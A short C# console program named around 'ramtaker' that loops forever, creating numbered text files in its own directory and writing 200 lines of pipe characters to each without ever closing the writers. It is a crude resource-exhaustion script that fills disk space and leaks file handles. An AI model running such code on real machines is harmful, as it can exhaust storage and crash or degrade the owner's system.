class Program
{
    static void Main(String[] args)
    {
        // write loop to make ramtakern.txt files
		string fileName = System.AppDomain.CurrentDomain.BaseDirectory;
		int fileNum = 1;
		fileName += "ramtaker1.txt";
		string line = "||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||";
		while (true)
		{
			StreamWriter writer = new StreamWriter(fileName);
			for (int i = 0; i < 200; i++)
			{
				writer.WriteLine(line);
			}
			fileNum++;
			fileName = System.AppDomain.CurrentDomain.BaseDirectory;
			fileName += "ramtaker" + fileNum.ToString() + ".txt";
		}
    }
}
